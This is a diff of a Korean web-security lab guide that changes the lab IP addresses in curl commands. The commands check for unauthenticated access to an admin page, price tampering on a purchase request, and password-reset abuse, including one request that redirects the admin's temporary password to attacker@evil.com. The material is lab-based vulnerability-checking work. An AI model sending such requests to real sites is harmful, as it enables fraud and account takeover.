@@ -36,8 +36,8 @@ mermaid: true
 
 | 구분 | 내용 |
 |---|---|
-| 공격자 | Kali Linux (192.168.0.10) — 브라우저, Burp Suite, curl |
-| 대상 | Ubuntu + Apache/PHP (192.168.0.30) |
+| 공격자 | Kali Linux (192.168.56.10) — 브라우저, Burp Suite, curl |
+| 대상 | Ubuntu + Apache/PHP (192.168.56.30) |
 
 ---
 
@@ -90,10 +90,10 @@ echo "주문 완료: 상품 $id, 결제금액 {$price}원";
 
 ```bash
 # (1) 비로그인 상태로 내부 관리 페이지 직접 접근 → 노출되면 취약
-curl -s http://192.168.0.30/userManage/userInfo.php
+curl -s http://192.168.56.30/userManage/userInfo.php
 
 # (2) 가격 변조 — 정가 30,000원 상품을 100원으로
-curl -s -X POST http://192.168.0.30/buy.php -d "id=0012345&price=100"
+curl -s -X POST http://192.168.56.30/buy.php -d "id=0012345&price=100"
 # → "결제금액 100원" 이 처리되면 취약
 ```
 
@@ -153,11 +153,11 @@ echo "임시 비밀번호 [$temp] 를 $email 으로 전송했습니다.";   // �
 ```bash
 # Step 1) 약한 보안질문/단순 정보로 복구되는지 (육안 점검)
 # Step 2) 임시 비밀번호가 예측 가능한 패턴인지
-curl -s -X POST http://192.168.0.30/reset.php -d "user=alice&email=alice@lab.local"
+curl -s -X POST http://192.168.56.30/reset.php -d "user=alice&email=alice@lab.local"
 # → "임시 비밀번호 [ALICE5]" 처럼 규칙적이면 취약
 
 # Step 3) 수신자(email) 변조로 공격자에게 전송되는지
-curl -s -X POST http://192.168.0.30/reset.php -d "user=admin&email=attacker@evil.com"
+curl -s -X POST http://192.168.56.30/reset.php -d "user=admin&email=attacker@evil.com"
 # → admin 계정의 임시 비번이 공격자 메일로 가면 취약
 ```
 
